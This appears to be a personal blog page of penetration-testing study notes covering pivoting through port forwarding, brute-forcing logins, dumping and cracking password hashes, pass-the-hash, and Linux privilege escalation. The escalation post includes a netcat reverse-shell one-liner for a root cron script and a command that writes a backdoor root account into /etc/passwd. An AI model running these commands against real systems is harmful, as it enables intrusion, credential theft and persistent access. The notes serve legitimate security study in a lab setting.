<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="No Description"><meta name="keywords" content=""><meta name="author" content="Gavin Cui"><meta name="copyright" content="Gavin Cui"><title>No Subtitle | Gavin's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gavin Cui</div><div class="author-info__description text-center">No Description</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">24</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">8</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gavin's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Gavin's Blog</div><div id="site-sub-title">No Subtitle</div><div id="site-social-icons"><a class="social-icon" href="https://github.com/Gavincrz" target="_blank" rel="noreferrer noopener nofollow"><i class="fa-github-square fab"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/08/Study-Notes-2021-07-08/">Study Notes - 2021/07/08</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-08</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Http-tunneling-through-deep-packet-inspection"><a href="#Http-tunneling-through-deep-packet-inspection" class="headerlink" title="Http tunneling through deep packet inspection"></a>Http tunneling through deep packet inspection</h1><p>Senario: only a specific protocal is allowed. E.g. ssh protocal is not allowed. and theres a deep packet inspection in the firewall that only allow http packet. An unused port 1234 is open by misconfiguration (unusal in real case)<br>port 3389 remote desktop prot </p>
<p>On compromised linux machine:   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 0.0.0.0:8888:w.x.y.z:3389 student@127.0.0.1  </span><br></pre></td></tr></table></figure>

<p>it is not restricted since they both in the internal subnet  </p>
<p>encapsulate the tunnel within http package</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install httptunnel</span><br></pre></td></tr></table></figure>

<p>http tunnel is server-client based, on compromised linux:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">student@debian:~$ hts --forward-port localhost:8888 1234</span><br></pre></td></tr></table></figure>
<p>on kali:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ htc --forward-port 8080 10.11.0.128:1234</span><br></pre></td></tr></table></figure>


</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/07/Study-Notes-2021-07-07/">Study Notes - 2021/07/07</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-07</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h1><h2 id="RINETD"><a href="#RINETD" class="headerlink" title="RINETD"></a>RINETD</h2><p>Default configuration file: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;rinetd.conf</span><br></pre></td></tr></table></figure>

<p>bind address, bind port: listening address/port  connect address/port: destination  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># bindadress bindport connectaddress connectport</span><br><span class="line">0.0.0.0 80 216.58.207.142 80</span><br></pre></td></tr></table></figure>
<p>forword any connection to port 80 to google  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service rinetd restart</span><br><span class="line">ss -antp | grep &quot;80&quot;</span><br><span class="line">nc -nvv 10.11.0.4 80</span><br></pre></td></tr></table></figure>

<h1 id="SSH-Tunneling"><a href="#SSH-Tunneling" class="headerlink" title="SSH Tunneling"></a>SSH Tunneling</h1><h2 id="SSH-local-port-forwarding"><a href="#SSH-local-port-forwarding" class="headerlink" title="SSH local port forwarding"></a>SSH local port forwarding</h2><p>Senario:<br>victim1 already compromised, only accpet 8080, 22, 3389 port from outside. victim1 conenct to another subnetwork contains another target. Move tools to victim1 is not eligent and scalable, want to attack from our kali machine  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-L local_socket:host:hostport</span><br><span class="line">-L local_socket:remote_socket</span><br><span class="line">             Specifies that connections to the given TCP port or Unix socket</span><br><span class="line">             on the local (client) host are to be forwarded to the given host</span><br><span class="line">             and port, or Unix socket, on the remote side.  This works by al‐</span><br><span class="line">             locating a socket to listen to either a TCP port on the local</span><br><span class="line">             side, optionally bound to the specified bind_address, or to a</span><br><span class="line">             Unix socket.  Whenever a connection is made to the local port or</span><br><span class="line">             socket, the connection is forwarded over the secure channel, and</span><br><span class="line">             a connection is made to either host port hostport, or the Unix</span><br><span class="line">             socket remote_socket, from the remote machine.</span><br><span class="line"></span><br><span class="line">-N      Do not execute a remote command.  This is useful for just for‐</span><br><span class="line">             warding ports.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In our scenario, we want to forward port 445 (Microsoft networking without NetBIOS) on our Kali</span><br><span class="line">machine to port 445 on the Windows Server 2016 target. When we do this, any Microsoft file</span><br><span class="line">sharing queries directed at our Kali machine will be forwarded to our Windows Server 2016 target.</span><br><span class="line">This seems impossible given that the firewall is blocking traffic on TCP port 445, but this port</span><br><span class="line">forward is tunneled through an SSH session to our Linux target on port 22, which is allowed</span><br><span class="line">through the firewall. In summary, the request will hit our Kali machine on port 445, will be</span><br><span class="line">forwarded across the SSH session, and will then be passed on to port 445 on the Windows Server</span><br><span class="line">2016 target.</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128</span><br></pre></td></tr></table></figure>

<h1 id="SSH-Remote-port-forwarding"><a href="#SSH-Remote-port-forwarding" class="headerlink" title="SSH Remote port forwarding"></a>SSH Remote port forwarding</h1><p>Senario:  </p>
<p>the firewall is blocking inbound TCP port 22 (SSH) connections, so we can’t<br>SSH into this server from our Internet-connected Kali machine</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim1: ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4</span><br></pre></td></tr></table></figure>

<p>forword all 10.11.0.4:2221 request from kali machien to 127.0.0.1:3306</p>
<p>on kali:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 2221</span><br><span class="line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="line">Host is up (0.000039s latency).</span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">2221&#x2F;tcp open mysql MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds</span><br></pre></td></tr></table></figure>

<p>scan local port will scan target host  </p>
<h1 id="SSH-Dynamic-port-forwarding"><a href="#SSH-Dynamic-port-forwarding" class="headerlink" title="SSH Dynamic port forwarding"></a>SSH Dynamic port forwarding</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -D &lt;address to bind to&gt;:&lt;port to bind to&gt; &lt;username&gt;@&lt;SSH server address&gt;</span><br></pre></td></tr></table></figure>
<p>With the above syntax in mind, we can create a local SOCKS4 application proxy (-N -D) on our<br>Kali Linux machine on TCP port 8080 (127.0.0.1:8080), which will tunnel all incoming traffic to<br>any host in the target network, through the compromised Linux machine, which we log into as<br>student</p>
<p>We can run any network application through HTTP, SOCKS4, and SOCKS5<br>proxies with the help of ProxyChains</p>
<p>add to <code>/etc/proxychains.conf</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 127.0.0.1 8080</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains nmap --top-ports&#x3D;20 -sT -Pn 192.168.1.110</span><br></pre></td></tr></table></figure>

<h1 id="PLINK-exe"><a href="#PLINK-exe" class="headerlink" title="PLINK.exe"></a>PLINK.exe</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4</span><br></pre></td></tr></table></figure>
<p>if it is the first time, it will attmpt to cache the host key and there’s a interactive step y/n</p>
<p>solution: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4</span><br></pre></td></tr></table></figure>

<h1 id="netSH"><a href="#netSH" class="headerlink" title="netSH"></a>netSH</h1><p>use netsh to do port forwarding on windows, it is installed on windows by default. </p>
<p>However, for this to work, the Windows system must have the IP Helper service running and IPv6<br>support must be enabled for the interface we want to use. Fortunately, both are on and enabled<br>by default on Windows operating systems.  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport&#x3D;4455 listenaddress&#x3D;10.11.0.22 connectport&#x3D;445 connectaddress&#x3D;192.168.1.110</span><br><span class="line">netstat -anp TCP | find &quot;4455&quot; </span><br></pre></td></tr></table></figure>

<p>By default, firewall does not allow inbound connection to 4455, however, we have system privilege, we can change the firewall configuration  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;forward_port_rule&quot; protocol&#x3D;TCP dir&#x3D;in localip&#x3D;10.11.0.22 localport&#x3D;4455 action&#x3D;allow</span><br></pre></td></tr></table></figure>

<p>before using smbclient, smb need to be configured with min protocal level = smbv2 and restart </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;samba&#x2F;smb.conf</span><br><span class="line">min protocol &#x3D; SMB2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;smbd restart</span><br><span class="line">smbclient -L 10.11.0.22 --port&#x3D;4455 --user&#x3D;Administrator</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/06/Study-Notes-2021-07-06/">Study Notes - 2021/07/06</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-06</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="HTTP-htaccess-password-attack-with-medusa"><a href="#HTTP-htaccess-password-attack-with-medusa" class="headerlink" title="HTTP htaccess password attack with medusa"></a>HTTP htaccess password attack with medusa</h1><p>decompress the rockyou wordlist:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gunzip &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 10.11.0.22 -u admin -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -M http -m DIR:&#x2F;admin</span><br></pre></td></tr></table></figure>

<h1 id="password-Attack-against-Remote-Desktop-Protocal-with-crowbar"><a href="#password-Attack-against-Remote-Desktop-Protocal-with-crowbar" class="headerlink" title="password Attack against Remote Desktop Protocal with crowbar"></a>password Attack against Remote Desktop Protocal with crowbar</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crowbar -b rdp -s 10.11.0.22&#x2F;32 -u admin -C ~&#x2F;password-file.txt -n 1  </span><br></pre></td></tr></table></figure>

<p>-n number of threads<br>-b protocal<br>-s host<br>-u username<br>-C wordlist  </p>
<p>rdp does not reliably handle multiple threads, so we use single thread </p>
<h1 id="SSH-Attack-with-THC-Hydra"><a href="#SSH-Attack-with-THC-Hydra" class="headerlink" title="SSH Attack with THC-Hydra"></a>SSH Attack with THC-Hydra</h1><p>-l target username<br>-P wordlist<br>protocal://IP  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l kali -P test_wdlist.txt ssh:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure>



<h1 id="HTTP-post-attack-with-THC-Hydra"><a href="#HTTP-post-attack-with-THC-Hydra" class="headerlink" title="HTTP post attack with THC-Hydra"></a>HTTP post attack with THC-Hydra</h1><p>obtain addtional info about http-form-post options</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra http-form-post -U </span><br><span class="line"></span><br><span class="line">&lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 10.11.0.22 http-form-post &quot;&#x2F;form&#x2F;frontpage.php:user&#x3D;admin&amp;pass&#x3D;^PASS^:INVALID LOGIN&quot; -l admin -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -vV -f</span><br></pre></td></tr></table></figure>
<p>request verbose output with -vV, and use -f to stop the attack when the first successful result is found.</p>
<h1 id="Retrieve-Password-hashes"><a href="#Retrieve-Password-hashes" class="headerlink" title="Retrieve Password hashes"></a>Retrieve Password hashes</h1><p><code>hashid &lt;hashvalue&gt;</code> to identify hash type  </p>
<p>inspect /etc/shadow file </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grep root &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$18cMHZ.mB57eU82l$lim7jazX00mXUZEB43IOtlHmpFcuTrceOJ1QObdaGr5fwsfsEryh5xcuJEpH7qOyiOmQHcGkn33vhy66GQDAi1:18696:0:99999:7:::</span><br></pre></td></tr></table></figure>
<p>the first of which ($6) references the SHA-512 algorithm  </p>
<ul>
<li>$1 = MD5 hashing algorithm.</li>
<li>$2 =Blowfish Algorithm is in use.</li>
<li>$2a=eksblowfish Algorithm</li>
<li>$5 =SHA-256 Algorithm</li>
<li>$6 =SHA-512 Algorithm<br>18cMHZ.mB57eU82l the salt  </li>
</ul>
<p>SAM database cannot be copied while the operating system is running because the Windows kernel keeps an exclusive file system lock on the file.</p>
<p>mimikatz modules facilitate password hash extraction from the Local Security Authority Subsystem (LSASS) process memory where they are cached.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Tools\password_attacks\mimikatz.exe</span><br><span class="line">&gt; privilege::debug</span><br><span class="line">&gt; token::elevate</span><br><span class="line">&gt; lsadump::sam</span><br></pre></td></tr></table></figure>
<p>token::elevate command to elevate the security token from high integrity (administrator) to SYSTEM integrity. If mimikatz is launched from a SYSTEM shell, this step is not required.  </p>
<p>use lsadump::sam to dump the contents of the SAM database</p>
<h1 id="Passing-the-hash-in-windows"><a href="#Passing-the-hash-in-windows" class="headerlink" title="Passing the hash in windows"></a>Passing the hash in windows</h1><p>The Pass-the-Hash (PtH) technique (discovered in 1997) allows an attacker to authenticate to a<br>remote target by using a valid combination of username and NTLM/LM hash rather than a clear<br>text password. This is possible because NTLM/LM password hashes are not salted and remain<br>static between sessions. Moreover, if we discover a password hash on one target, we cannot only<br>use it to authenticate to that target, we can use it to authenticate to another target as well, as long<br>as that target has an account with the same username and password.</p>
<p>Security Accounts Manager (SAM)  </p>
<p>To do this, we will use pth-winexe from the Passing-The-Hash toolkit (a modified version of winexe), which performs authentication using the SMB protocol</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e &#x2F;&#x2F;10.11.0.22 cmd</span><br></pre></td></tr></table></figure>

<p>Question: what does “aad3b435b51404eeaad3b435b51404ee” do ? why there are two hashes?<br>aad3b435b51404eeaad3b435b51404ee: Empty LM HASH <code>&lt;LM hash&gt;:&lt;NTLM hash&gt;</code>    </p>
<p>NTLM hash algorithn:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD4(UTF-16-LE(password))</span><br></pre></td></tr></table></figure>

<p>Behind the scenes, the format of the NTLM hash we provided was changed into a NetNTLM<br>version 1 or 2 format during the authentication process. We can capture these hashes using<br>man-in-the-middle or poisoning attacks and either crack them581 or relay them</p>
<p><a target="_blank" rel="noopener" href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</a>  </p>
<h1 id="Password-cracking"><a href="#Password-cracking" class="headerlink" title="Password cracking"></a>Password cracking</h1><p>recover clear text password from hash  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash.txt --format&#x3D;NT</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txt --format&#x3D;NT</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --rules --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txt --format&#x3D;NT</span><br></pre></td></tr></table></figure>

<h2 id="use-john-with-linux-password"><a href="#use-john-with-linux-password" class="headerlink" title="use john with linux password"></a>use john with linux password</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep victim &#x2F;etc&#x2F;passwd &gt; test_pw.txt</span><br><span class="line">sudo grep victim &#x2F;etc&#x2F;shadow &gt; test_shadow.txt</span><br><span class="line">unshadow test_pw.txt test_shadow.txt &gt; test_unshadow.txt</span><br><span class="line">john est_unshadow.txt</span><br></pre></td></tr></table></figure>

<p>john need the unshadow format as input hash  </p>
<p>I created a victim user, but the hash type is $y$ which can not be cracked </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/06/28/Arknights-Remote-Access/">Arknights Remote Access</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-06-28</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Project/">Project</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Thoughts/">Thoughts</a></span><div class="content"><h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>I played Arknights on Bilibili Server(Android only) with Android emulator, tries to clear some daily task with my iOS device.</p>
<h1 id="Attempts"><a href="#Attempts" class="headerlink" title="Attempts"></a>Attempts</h1><ul>
<li>Approch 1: UI less arknights: need to capture and analyze some packages. I searched on github, all auto scripts are based on Android Emulator. </li>
<li>Approch 2: have an android emulator running on remote server, and control it with those auto scripts (CV based). However, it seems rented cloud VMs does not support nested virtualization (android emulator is another vm)</li>
<li>Approch 3 (Current approch): Run emulator on my own windows machine, connect both windows machine and mobile phone (or browser if provide a web based console) to the server. Drawback: access speed would be slow, since need to communicate with both web client and windows machine. Need to keep my own PC running at home while access it. Need authentication to avoid Man-in-the-middle attack. Tried to find a way directly connect two machines behind NAT (NAT Traversal)</li>
</ul>
<h1 id="Design-PC-side"><a href="#Design-PC-side" class="headerlink" title="Design - PC side"></a>Design - PC side</h1><h2 id="Connect-Emulator-with-adb"><a href="#Connect-Emulator-with-adb" class="headerlink" title="Connect Emulator with adb"></a>Connect Emulator with adb</h2><p>Download android sdk platform tool (adb included), add to PATH  </p>
<p>default adb server running on <code>127.0.0.1:5037</code></p>
<p>Mumu emulator</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb connect 127.0.0.1:7555</span><br><span class="line">adb shell</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/09/Useful-Pentest-Reference/">Useful Pentest Reference</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-09</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Links/">Links</a></span><div class="content"><p>Reverse shell cheat sheet:<br><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>  </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/09/Study-Notes-2021-05-09/">Study Notes - 2021/05/09</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-09</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Linux-Privilege-Escalation"><a href="#Linux-Privilege-Escalation" class="headerlink" title="Linux Privilege Escalation"></a>Linux Privilege Escalation</h1><h2 id="Insecure-file-permissions"><a href="#Insecure-file-permissions" class="headerlink" title="Insecure file permissions"></a>Insecure file permissions</h2><h2 id="Cron-based-time-job"><a href="#Cron-based-time-job" class="headerlink" title="Cron based time job"></a>Cron based time job</h2><p>Inspect cron log for running jobs</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;CRON&quot; &#x2F;var&#x2F;log&#x2F;cron.log  </span><br><span class="line"></span><br><span class="line">Jan27 17:45:01 victim CRON[2615]:(root) CMD (cd &#x2F;var&#x2F;scripts&#x2F; &amp;&amp; .&#x2F;user_backups.sh)</span><br><span class="line">Jan27 17:50:01 victim CRON[2631]:(root) CMD (cd &#x2F;var&#x2F;scripts&#x2F; &amp;&amp; .&#x2F;user_backups.sh)</span><br><span class="line">Jan27 17:55:01 victim CRON[2656]:(root) CMD (cd &#x2F;var&#x2F;scripts&#x2F; &amp;&amp; .&#x2F;user_backups.sh)</span><br><span class="line">Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd &#x2F;var&#x2F;scripts&#x2F; &amp;&amp; .&#x2F;user_backups.sh)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>run every 5 mins</p>
<p>ls -lah to show its permission (rwxrwxrwx)</p>
<p>add following to the script (See <a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse-shell-Cheat-Sheet</a>)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.11.0.4 1234 &gt;&#x2F;tmp&#x2F;f </span><br></pre></td></tr></table></figure>

<h2 id="Insecure-etc-passwd-Permission"><a href="#Insecure-etc-passwd-Permission" class="headerlink" title="Insecure /etc/passwd Permission"></a>Insecure /etc/passwd Permission</h2><p>if a password hash is present in the second column of a /etc/passwd user record, it is considered valid for authentication and it takes <strong>precedence</strong> over the respective entry in /etc/shadow if available</p>
<h3 id="Generate-password-hash"><a href="#Generate-password-hash" class="headerlink" title="Generate password hash"></a>Generate password hash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd evil</span><br><span class="line">AK24fcSx2Il3I</span><br><span class="line"></span><br><span class="line">echo &quot;root2:AK24fcSx2Il3I:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&quot; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">username:passwordhash:userid:groupid:</span><br></pre></td></tr></table></figure>

